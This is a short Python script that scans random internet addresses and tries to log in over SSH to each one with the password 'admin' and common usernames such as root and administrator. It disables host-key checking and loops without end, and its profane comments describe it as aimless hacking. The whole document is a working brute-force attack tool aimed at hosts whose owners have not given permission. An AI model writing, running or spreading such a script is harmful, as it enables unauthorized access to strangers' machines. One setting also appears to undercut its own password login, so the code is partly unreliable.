import os
cmd = lambda user,ip: "sshpass -p \"admin\" ssh -o ConnectTimeout=3 -o BatchMode=yes -o StrictHostKeyChecking=no {}@{}".format(user,ip)
# this time we do not know shit about this fucking shit.
# we are just aimlessly hacking around the fucking internet.
# does not mean anything interesting.
import random
def get_ip():
    mp = lambda: str(random.randint(0,255))
    address = ".".join([mp() for x in range(4)])
    return address

if __name__ == "__main__":
    while True:
        address = get_ip()
        user = random.choice(("administrator","root","test","guest"))
        command = cmd(user,address)
        os.system(command)
